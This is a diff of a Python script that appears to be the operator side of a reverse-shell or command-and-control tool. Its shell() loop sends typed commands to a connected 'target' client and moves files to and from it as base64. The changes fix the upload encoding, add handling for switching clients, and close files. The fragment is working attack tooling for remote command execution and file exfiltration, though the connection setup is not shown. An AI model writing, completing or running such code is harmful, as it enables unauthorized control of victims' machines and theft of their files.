@@ -17,26 +17,34 @@ def recv_j():
             except ValueError: #if the output of json.loads(data) is not complete (not in json format)
                 continue
 def shell():
+    #outside of while loop we can set up an input for sessions and client management
+    #and only the client connected will enter the loop and when exit we come back to choosing clients
     while True:
-        cmd = input("# ")
+        cmd =  input("# ")
         send_j(cmd) # send command to client
         if cmd == "exit_server":
             break
-        elif cmd[:2] == "cd":
+        if cmd == "exit_client":
+            continue
+        elif cmd[:2] == "cd" and len(cmd) > 2: #only if cd and a path (if cd only it runs as normal command)
             continue
         elif cmd[:8] == "download":
             with open(cmd[9:],"wb") as f:
                 data = recv_j()
                 f.write(base64.b64decode(data)) #receive content of file from client and write into a speified file name
-
+                f.close()
+            continue
         elif cmd[:6] == "upload":
             try:
                 with open(cmd[7:], "rb") as f:
-                    send_j(base64.b64encode(f.read())) #send the content of the file in the server
-            except:
-                send_j(base64.b64encode("failed to upload").decode('utf-8'))
+                    send_j(base64.b64encode(f.read()).decode('utf-8')) #send the content of the file in the server
+                    f.close()
                 continue
-        output = recv_j() #receive output from client "target"
+            except:
+                error = "failed to upload"
+                send_j(base64.b64encode(error.encode('utf-8')).decode('utf-8'))
+                #continue
+        output = recv_j() #receive output from client
         print(output)
 
 def server():
